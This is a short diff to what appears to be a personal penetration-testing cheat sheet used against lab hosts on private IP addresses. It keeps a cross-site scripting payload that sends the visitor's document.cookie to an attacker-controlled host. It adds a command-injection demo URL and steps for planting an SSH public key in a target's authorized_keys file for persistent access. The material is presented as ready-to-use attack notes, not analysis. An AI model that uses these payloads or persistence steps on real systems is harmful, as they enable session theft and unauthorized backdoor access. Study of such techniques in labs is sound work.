@@ -1,4 +1,5 @@
     10.50.29.184/path/pathdemo.php
+    10.50.29.184/cmdinjectdemo.php
 ________________________________________________________________________________________________________________
     <script>document.location="http://10.50.21.223:8000"+document.cookie;</script>
 ________________________________________________________________________________________________________________
@@ -20,10 +21,12 @@ ________________________________________________________________________________
     ?>
     </pre>
     </BODY></HTML>
-
 ________________________________________________________________________________________________________________
-
-
+## Uploading SSH Key: 
+    ls -la /users/home/directory       #check if .ssh exists
+    mkdir /users/home/directory/.ssh   #make .ssh in users home folder if it does not exist
+    echo "your_public_key_here" >> /users/home/directory/.ssh/authorized_keys
+    cat /users/home/directory/.ssh/authorized_keys
 ________________________________________________________________________________________________________________
 
 
